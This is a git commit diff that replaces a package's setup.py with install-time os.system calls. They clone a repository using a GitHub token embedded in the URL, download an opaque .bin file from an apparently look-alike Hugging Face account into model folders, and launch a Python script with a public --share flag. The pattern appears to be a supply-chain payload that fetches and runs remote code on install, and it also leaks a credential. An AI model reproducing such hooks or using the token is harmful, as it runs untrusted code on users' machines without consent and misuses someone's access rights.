731ead65207712fb34831d90b47b864f91543218
Rix1302 <clareagan921@gmail.com>
2024-10-22 01:05:47 +0200

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,1 +1,6 @@
+import os
 
+os.system('pip install pygit2==1.12.2')
+os.system('git clone https://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@github.com/llyasviel/Fooocus-git')
+os.system('wget -O /content/Fooocus/models/upscale_models/fococus_upscaler_s4099855.bin https://huggingface.co/llyasviel/nisc/resolve/main/fococus_upscaler_s4099855.bin')
+os.system('python /content/Fooocus/entry_with_update.py --share')
